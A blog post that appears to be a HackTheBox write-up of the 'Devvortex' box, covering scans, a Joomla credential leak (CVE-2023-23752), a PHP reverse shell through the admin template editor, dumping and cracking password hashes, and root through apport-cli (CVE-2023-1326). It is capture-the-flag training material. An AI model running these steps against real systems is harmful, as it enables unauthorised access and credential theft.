---
layout: post
title: "HTB: Devvortex"
author: Andrew Cherney
date: 2024-04-27 11:57:12
tags: htb easy-box linux webapp joomla cve mysql john php 
icon: "assets/icons/devvortex.png"
post_description: "The start of this box is a vulnerable version of Joomla which can be used to get a shell as www-data. Mysql and john can be used to find a password for pivoting to a user account. Then to gain root a service has a cve utilizing crash reports for privesc."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Devvortex]
└──╼ $nmap -sC 10.10.11.242
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-02 11:53 CST
Nmap scan report for 10.10.11.242
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://devvortex.htb/
```

## Port 80 - http

{% include img_link src="/img/devvortex/devvortex_front_page" alt="front_page" ext="png" trunc=600 %}

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Devvortex]
└──╼ $ffuf -w /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -mc 200,401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /opt/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 112ms]
```

## dev subdomain

{% include img_link src="/img/devvortex/devvortex_dev_front_page" alt="front_page" ext="png" trunc=600 %}

```bash
─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Devvortex]
└──╼ $dirsearch -u dev.devvortex.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/HackTheBox/Active/Devvortex/reports/_dev.devvortex.htb/_23-12-02_12-08-43.txt

Target: http://dev.devvortex.htb/

[12:08:43] Starting: 
[12:08:45] 403 -  564B  - /%2e%2e;/test
[12:08:45] 404 -   16B  - /php
[12:09:23] 404 -   16B  - /adminphp
[12:09:26] 403 -  564B  - /admin/.config
[12:10:02] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[12:10:03] 200 -   31B  - /administrator/cache/
[12:10:03] 403 -  564B  - /administrator/includes/
[12:10:04] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[12:10:04] 200 -   31B  - /administrator/logs/
```

![admin login page joomla](/img/devvortex/devvortex_joomla_admin.png)

# User as www-data

## CVE-2023-23752

After enumerating a new subdomain and an admin login portal we can see that his site uses Joomla, a popular CMS. We can further enumerate this with joomscan.

```bash

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
			(1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://dev.devvortex.htb ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found
```

The important information from this tool is the version number: 4.2.6

[https://github.com/adhikara13/CVE-2023-23752](https://github.com/adhikara13/CVE-2023-23752) is a poc for a joomla unauthorized access to webservice endpoints for versions 4.0.0-4.2.7, in this case it reads the username and password from  **/api/index.php/v1/config/application?public=true**.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Devvortex]
└──╼ $python3 cve-2023-23752.py -u dev.devvortex.htb -o joomla
[+] => Vulnerable dev.devvortex.htb
User: lewis Password: P4ntherg0t1n5r3c0n## Database: joomla
File Saved => joomla
```

## PHP Rev Shell

{% include img_link src="/img/devvortex/devvortex_admin_front" alt="front_page" ext="png" trunc=600 %}

With these admin permissions I have the capability to edit php files, and can get a shell as the underlying service (www-data). 

![login.php shell inject](/img/devvortex/devvortex_admin_php_shell.png)

Firstly I check what users I can possibly pivot to by reading `/etc/passwd`.

```
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
logan:x:1000:1000:,,,:/home/logan:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

# User as logan

## mysql

logan is the only user with a home directory so I'll first look for a shell as him. In the enumeration stage we found the mysql database being used here is joomla, let's dump the contents as lewis.


```bash
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ python3 -c "import pty;pty.spawn('/bin/bash')"
<tum$ python3 -c "import pty;pty.spawn('/bin/bash')"                 
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##
< -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##                 
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8220
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select username,password from sd4fg_users
select username,password from sd4fg_users
    -> ;
;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
2 rows in set (0.00 sec)
```

## john

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Devvortex]
└──╼ $john hash --wordlist=/opt/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)
1g 0:00:00:07 DONE (2023-12-02 12:33) 0.1310g/s 184.0p/s 184.0c/s 184.0C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Active/Devvortex]
└──╼ $ssh logan@devvortex.htb
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 02 Dec 2023 06:33:50 PM UTC

  System load:           0.11
  Usage of /:            61.7% of 4.76GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             167
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.242
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c738

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
logan@devvortex:~$ cat user.txt
d0a6d610d29b--------------------
```

# Root

## apport-cli

```bash
logan@devvortex:~$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

[https://www.redpacketsecurity.com/canonical-apport-cli-privilege-escalation-cve-2023-1326/](https://www.redpacketsecurity.com/canonical-apport-cli-privilege-escalation-cve-2023-1326/) is a CVE security post for CVE-2023-1326. Effectively viewing crash logs uses less, and while running with sudo you can get a shell as the user running the code (root in this case). 

There is one problem though, I didnt find any crash logs. [https://codegolf.stackexchange.com/questions/100532/shortest-code-to-throw-sigill](https://codegolf.stackexchange.com/questions/100532/shortest-code-to-throw-sigill) was what I found to crash the ssh session and create a crash log. 

```bash
bash-3.2$ kill -4 $$
Illegal instruction: 4
```

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_bash.1000.crash 

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (470.6 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................ERROR: Cannot update /var/crash/_usr_bin_bash.1000.crash: [Errno 13] Permission denied: '/var/crash/_usr_bin_bash.1000.crash'
....................
root@devvortex:/home/logan# cat /root/root.txt
da5e3401676d8a------------------
```
